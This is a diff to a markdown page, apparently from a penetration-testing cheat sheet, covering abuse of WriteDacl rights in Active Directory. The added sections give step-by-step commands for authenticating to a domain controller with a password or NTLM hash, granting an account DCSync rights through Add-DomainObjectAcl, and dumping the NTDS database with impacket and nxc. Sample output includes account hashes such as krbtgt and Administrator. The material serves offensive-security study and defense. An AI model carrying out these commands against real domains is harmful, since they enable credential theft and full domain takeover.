@@ -6,8 +6,47 @@ tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directo
 
 ### Abuse #1: Add dcsync right to user
 
-{{< tab set1 tab1 active >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active >}}powerview.py{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
+
+#### 1. Connect to DC
+
+```console
+# With password
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+```console
+# With hash
+powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H <HASH>
+```
+
+```console {class="sample-code"}
+$ powerview 'CORP.LOCAL/WEB01$@172.16.1.5' -H 7ddf32e17a6ac5ce04a8ecbf782ca509
+(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
+PV > 
+```
+
+#### 2. Add dcsync right
+
+```console
+Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
+```
+
+```console {class="sample-code"}
+(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
+PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC=local' -Rights DCSync
+[2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local
+[2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local
+[2024-10-01 12:51:36] DACL modified successfully!
+```
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### 1. Import PowerView
 
@@ -36,7 +75,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 #### 3. Add dcsync right
 
 ```console
-Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
+Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync -Credential $cred
 ```
 
 ```console {class="sample-code"}
@@ -45,9 +84,10 @@ Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_
 
 {{< /tabcontent >}}
 
-### 4. Secrets dump
+#### Secrets dump
 
-{{< tab set2 tab1 active >}}Linux{{< /tab >}}
+{{< tab set2 tab1 >}}impacket{{< /tab >}}
+{{< tab set2 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
@@ -67,6 +107,24 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ...[SNIP]...
 [*] Cleaning up...
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+```console
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
+```
+
+```console {class="sample-code"}
+$ nxc smb 172.16.1.5 -d CORP.LOCAL -u 'WEB01$' -H 7ddf32e17a6ac5ce04a8ecbf782ca509 --ntds
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
+SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
+SMB         172.16.1.5      445    DC01             [+] CORP.LOCAL\WEB01$:7ddf32e17a6ac5ce04a8ecbf782ca509
+SMB         172.16.1.5      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+SMB         172.16.1.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         172.16.1.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
+...[SNIP]...
 ```
 
 {{< /tabcontent >}}
